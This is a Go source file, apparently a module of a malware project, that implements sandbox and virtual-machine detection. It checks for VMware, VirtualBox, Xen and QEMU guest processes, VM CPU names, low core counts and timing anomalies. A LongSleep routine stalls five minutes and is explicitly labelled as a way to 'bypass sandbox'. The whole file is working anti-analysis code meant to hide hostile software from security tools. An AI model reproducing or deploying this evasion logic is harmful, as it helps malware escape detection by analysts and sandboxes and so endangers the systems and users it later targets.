package evasion

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Détection complète de sandbox/VM - retourne (isSandbox, detailsString)
func IsSandbox() (bool, string) {
	var result strings.Builder
	result.WriteString("\n🔍 Détection d'environnement...\n")
	suspicions := 0

	// 1. Vérifier les processus VM
	vmProcesses := []string{
		"vmtoolsd.exe",    // VMware Tools
		"VBoxTray.exe",    // VirtualBox
		"VBoxService.exe", // VirtualBox
		"xenservice.exe",  // Xen
		"qemu-ga.exe",     // QEMU
	}

	for _, proc := range vmProcesses {
		if processExists(proc) {
			result.WriteString(fmt.Sprintf("  ⚠️ Processus VM détecté: %s\n", proc))
			suspicions++
		}
	}

	// 2. Vérifier les noms de CPU
	cpuName := getCPUName()
	vmCPUs := []string{"QEMU", "VirtualBox", "VMware", "KVM"}
	for _, vmCPU := range vmCPUs {
		if strings.Contains(cpuName, vmCPU) {
			result.WriteString(fmt.Sprintf("  ⚠️ CPU VM détecté: %s\n", cpuName))
			suspicions++
			break
		}
	}

	// 3. Vérifier le nombre de CPUs
	if runtime.NumCPU() < 4 {
		result.WriteString(fmt.Sprintf("  ⚠️ Peu de CPUs: %d\n", runtime.NumCPU()))
		suspicions++
	}

	// 4. Test du temps
	result.WriteString("  ⏳ Test de temporisation...\n")
	start := time.Now()
	time.Sleep(2 * time.Second)
	elapsed := time.Since(start)

	if elapsed < 2*time.Second {
		result.WriteString("  ⚠️ Anomalie temporelle détectée!\n")
		suspicions++
	}

	// Décision finale
	result.WriteString(fmt.Sprintf("🔍 Résultat: %d indicateurs suspects\n", suspicions))
	return suspicions >= 2, result.String()
}

// Vérifie si un processus existe
func processExists(name string) bool {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist", "/fi", "imagename eq "+name)
		output, _ := cmd.CombinedOutput()
		return strings.Contains(string(output), name)
	}
	return false
}

// Récupère le nom du CPU
func getCPUName() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "cpu", "get", "name")
		output, _ := cmd.CombinedOutput()
		lines := strings.Split(string(output), "\n")
		if len(lines) > 1 {
			return strings.TrimSpace(lines[1])
		}
	}
	return ""
}

// Sleep long pour bypass sandbox
func LongSleep() {
	fmt.Println("😴 Attente longue (5 minutes) pour bypass sandbox...")
	time.Sleep(5 * time.Minute)
	fmt.Println("✅ Réveil!")
}
